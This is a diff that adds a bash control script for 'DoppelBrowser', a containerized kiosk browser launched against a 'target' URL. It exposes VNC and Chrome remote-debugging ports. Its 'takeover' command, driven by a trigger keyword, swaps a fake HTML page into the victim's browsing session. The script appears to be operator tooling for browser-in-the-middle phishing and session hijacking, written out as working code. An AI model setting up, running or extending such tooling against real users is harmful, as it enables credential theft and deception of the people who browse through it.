@@ -1,0 +1,171 @@
+#!/bin/bash
+
+CONTAINER_NAME="DoppelBrowser"
+IMAGE_NAME="doppelbrowser"
+
+print_menu() {
+    echo ""
+    echo "==== DoppelBrowser Control ===="
+    echo "start <url>  - Start container with a target"
+    echo "stop         - Stop container"
+    echo "restart      - Restart container"
+    echo "status       - Show container status"
+    echo "logs         - Follow logs"
+    echo "remove       - Remove container"
+    echo "takeover true or false <trigger keyword> <fake_page.html> - Take over the browser"
+    echo "exit         - Quit"
+    echo "================================"
+    echo ""
+}
+
+container_exists() {
+    docker ps -a --format '{{.Names}}' | grep -w "$CONTAINER_NAME" >/dev/null 2>&1
+}
+
+container_running() {
+    docker ps --format '{{.Names}}' | grep -w "$CONTAINER_NAME" >/dev/null 2>&1
+}
+
+start_container() {
+    if [ -z "$1" ]; then
+        echo "❌ You must provide a URL."
+        return
+    fi
+
+    URL="$1"
+
+    if container_running; then
+        echo "⚠ Container already running."
+        return
+    fi
+
+    if container_exists; then
+        echo "[*] Removing stopped container..."
+        docker rm "$CONTAINER_NAME"
+    fi
+
+    echo "[*] Starting container with URL: $URL"
+
+    docker run -d \
+        --name "$CONTAINER_NAME" \
+        -p 6901:6901 \
+        -p 9222:9222 \
+        -p 3000:3000 \
+        --shm-size=4g \
+        -e VNC_RESOLUTION=1920x1080 \
+        -e KASM_URL="$URL" \
+        -e APP_ARGS='--remote-debugging-port=9222 --no-sandbox --kiosk --new-window --start-fullscreen --disable-restore-session-state --disable-session-crashed-bubble --disable-features=TranslateUI,ExtensionsToolbarMenu,PasswordManagerOnboarding' \
+        "$IMAGE_NAME"
+
+    echo "✅ Started"
+    echo "👉 Access: https://localhost:6901"
+}
+
+stop_container() {
+    if container_running; then
+        docker stop "$CONTAINER_NAME"
+        echo "🛑 Stopped"
+    else
+        echo "⚠ Container not running."
+    fi
+}
+
+remove_container() {
+    if container_exists; then
+        docker rm -f "$CONTAINER_NAME"
+        echo "🗑 Removed"
+    else
+        echo "⚠ Container does not exist."
+    fi
+}
+
+restart_container() {
+    if container_exists; then
+        docker restart "$CONTAINER_NAME"
+        echo "🔄 Restarted"
+    else
+        echo "⚠ Container does not exist."
+    fi
+}
+
+status_container() {
+    docker ps -a -f name="$CONTAINER_NAME"
+}
+
+logs_container() {
+    if container_exists; then
+        docker logs -f "$CONTAINER_NAME"
+    else
+        echo "⚠ Container does not exist."
+    fi
+}
+
+takeover() {
+    ENABLED=$1
+    KEYWORD=$2
+    PAGE=$3
+
+    if [ -z "$ENABLED" ]; then
+        echo "Usage: dbrowser takeover <true|false> [keyword] [page]"
+        return
+    fi
+
+    JSON="{\"enabled\": $ENABLED"
+
+    if [ -n "$KEYWORD" ]; then
+        JSON="$JSON, \"keyword\": \"$KEYWORD\""
+    fi
+
+    if [ -n "$PAGE" ]; then
+        JSON="$JSON, \"page\": \"$PAGE\""
+    fi
+
+    JSON="$JSON}"
+
+    docker exec "$CONTAINER_NAME" \
+        curl -s -X POST http://127.0.0.1:4000/takeover \
+        -H "Content-Type: application/json" \
+        -d "$JSON"
+
+    echo ""
+    echo "Takeover updated."
+}
+# ===============================
+# Interactive loop
+# ===============================
+
+while true; do
+    read -p "DBrowser> " cmd arg1 arg2 arg3
+
+    case "$cmd" in
+        start)
+            start_container "$arg1"
+            ;;
+        stop)
+            stop_container
+            ;;
+        restart)
+            restart_container
+            ;;
+        status)
+            status_container
+            ;;
+        logs)
+            logs_container
+            ;;
+        remove)
+            remove_container
+            ;;
+        takeover)
+            takeover "$arg1" "$arg2" "$arg3"
+            ;;
+        exit)
+            echo "Bye."
+            break
+            ;;
+        *)
+            echo "Unknown command."
+            print_menu
+            ;;
+    esac
+done
